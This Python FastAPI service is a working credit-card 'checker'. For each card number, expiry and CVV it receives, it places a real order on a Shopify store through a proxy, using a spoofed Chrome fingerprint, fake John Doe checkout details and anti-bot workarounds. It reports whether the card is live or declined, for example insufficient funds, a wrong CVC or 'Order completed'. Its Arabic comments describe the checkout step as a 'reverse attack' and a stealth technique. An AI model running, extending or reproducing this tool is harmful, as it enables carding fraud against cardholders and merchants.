from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import json
import random

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def safe_response(msg, price, gate):
    """تشفير الكلمات لكي لا يحذف البوت البروكسي عن طريق الخطأ"""
    clean_msg = msg.replace("Proxy", "Prx").replace("proxy", "prx")
    clean_msg = clean_msg.replace("Connection", "Conn").replace("connection", "conn")
    clean_msg = clean_msg.replace("Timeout", "T-out").replace("timeout", "t-out")
    return {"Response": clean_msg, "Price": price, "Gate": gate}

async def check_shopify_graphql(cc_info, store_url, proxy):
    try:
        # 1. تنظيف بيانات البطاقة
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return safe_response("Invalid CC Format", "-", "Shopify API")
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        formatted_proxy = format_proxy(proxy)
        proxies = {"http": formatted_proxy, "https": formatted_proxy} if formatted_proxy else None

        # استخدام بصمة متصفح قوية
        async with AsyncSession(impersonate="chrome110", proxies=proxies, timeout=60, verify=False) as session:
            
            # 2. سحب المنتج بطريقة آمنة (التخفي)
            headers = {"Accept": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
            res_prod = await session.get(f"{store_url}/products.json?limit=10", headers=headers)
            
            if res_prod.status_code != 200:
                return safe_response(f"Site Protected or Dead (HTTP {res_prod.status_code})", "-", "Shopify API")
            
            data = res_prod.json()
            variant_id = None
            price = "-"
            
            for product in data.get('products', []):
                for variant in product.get('variants', []):
                    if variant.get('available', True):
                        p_val = float(variant.get('price', 0.0))
                        if p_val > 0.0:
                            variant_id = variant.get('id')
                            price = str(p_val)
                            break
                if variant_id: break

            if not variant_id:
                return safe_response("No available products found", "-", "Shopify API")

            # 3. الهجوم العكسي (تخطي السلة تماماً وإنشاء Checkout عبر الـ JSON API)
            checkout_create_url = f"{store_url}/wallets/checkouts.json"
            checkout_payload = {
                "checkout": {
                    "line_items": [{"variant_id": variant_id, "quantity": 1}],
                    "email": f"johndoe{random.randint(1000,9999)}@gmail.com",
                    "shipping_address": {
                        "first_name": "John", "last_name": "Doe",
                        "address1": "123 Main St", "city": "New York",
                        "province_code": "NY", "country_code": "US",
                        "zip": "10001", "phone": "2125551234"
                    }
                }
            }
            
            # هذا الطلب يتجاهل الـ HTML ويبني عملية دفع مباشرة في قاعدة البيانات
            res_checkout = await session.post(checkout_create_url, json=checkout_payload, headers=headers)
            
            # إذا فشل ה- JSON API، نلجأ للطريقة الكلاسيكية بقوة غاشمة
            checkout_url = ""
            auth_token = ""
            
            if res_checkout.status_code == 200 or res_checkout.status_code == 201:
                # نجحنا في بناء Checkout مباشر
                c_data = res_checkout.json()
                checkout_url = c_data.get("checkout", {}).get("web_url")
                
                # جلب التوكن من الرابط الجديد
                res_web = await session.get(checkout_url)
                html_web = res_web.text
                
                auth_match = re.search(r'name="authenticity_token"\s*value="([^"]+)"', html_web)
                if not auth_match:
                    auth_match = re.search(r'"authenticity_token"\s*:\s*"([^"]+)"', html_web)
                if auth_match: auth_token = auth_match.group(1)
            else:
                # الطريقة الكلاسيكية مع تصحيح الهيدرز
                add_url = f"{store_url}/cart/add.js"
                add_data = f"id={variant_id}&quantity=1"
                add_headers = {"Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json", "X-Requested-With": "XMLHttpRequest"}
                res_add = await session.post(add_url, data=add_data, headers=add_headers)
                
                if res_add.status_code != 200:
                    return safe_response("Cart Add Failed (Anti-Bot Active)", f"${price}", "Shopify API")
                
                res_web = await session.get(f"{store_url}/checkout", allow_redirects=True)
                html_web = res_web.text
                checkout_url = str(res_web.url)
                
                auth_match = re.search(r'name="authenticity_token"\s*value="([^"]+)"', html_web)
                if not auth_match:
                    auth_match = re.search(r'"authenticity_token"\s*:\s*"([^"]+)"', html_web)
                if auth_match: auth_token = auth_match.group(1)

            if not auth_token:
                if "Just a moment" in html_web or "Cloudflare" in html_web:
                    return safe_response("Cloudflare Challenge Blocked IP", f"${price}", "Shopify API")
                return safe_response("Token Not Found (Protected by Checkout Extensibility)", f"${price}", "Shopify API")

            # 4. تشفير البطاقة
            token_url = "https://deposit.us.shopifycs.com/sessions"
            token_payload = {"credit_card": {"number": cc, "name": "John Doe", "month": mm, "year": yy, "verification_value": cvv}}
            token_headers = {"Accept": "application/json", "Content-Type": "application/json"}
            
            res_token = await session.post(token_url, json=token_payload, headers=token_headers)
            if res_token.status_code != 200: 
                return safe_response("Failed to tokenize card (IP Banned)", f"${price}", "Shopify API")
            
            payment_token = res_token.json().get("id")

            # 5. استخراج بوابة الدفع
            gateway_id = "1"
            gate_match = re.search(r'name="checkout\[payment_gateway\]"\s*value="(\d+)"', html_web)
            if gate_match: gateway_id = gate_match.group(1)

            # 6. إرسال الدفع النهائي
            payment_payload = {
                "_method": "patch",
                "authenticity_token": auth_token,
                "previous_step": "payment_method",
                "step": "",
                "s": payment_token,
                "checkout[payment_gateway]": gateway_id, 
                "checkout[credit_card][vault]": "false",
                "checkout[different_billing_address]": "false",
                "complete": "1"
            }
            
            res_pay = await session.post(checkout_url, data=payment_payload, allow_redirects=True)
            result_html = res_pay.text.lower()
            
            # 7. قراءة الرد
            if "thank you" in result_html or "order completed" in result_html or res_pay.url.endswith('/thank_you'):
                return safe_response("Order completed 💎", f"${price}", "Shopify API")
            elif "insufficient funds" in result_html or "not enough funds" in result_html: 
                return safe_response("Insufficient Funds", f"${price}", "Shopify API")
            elif "incorrect_cvc" in result_html or "security code was not matched" in result_html: 
                return safe_response("Incorrect CVC", f"${price}", "Shopify API")
            elif "zip code does not match" in result_html or "avs" in result_html: 
                return safe_response("ZIP Code Mismatch", f"${price}", "Shopify API")
            elif "do not honor" in result_html or "generic_decline" in result_html: 
                return safe_response("Do Not Honor", f"${price}", "Shopify API")
            else:
                error_match = re.search(r'class="field__message field__message--error">([^<]+)<', res_pay.text)
                if error_match: return safe_response(error_match.group(1).strip(), f"${price}", "Shopify API")
                return safe_response("Declined / Custom Error", f"${price}", "Shopify API")

    except Exception as e:
        return safe_response(f"Sys_Err: {str(e)[:40]}", "-", "Shopify API")

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    result = await check_shopify_graphql(cc, url, proxy)
    return JSONResponse(content=result)
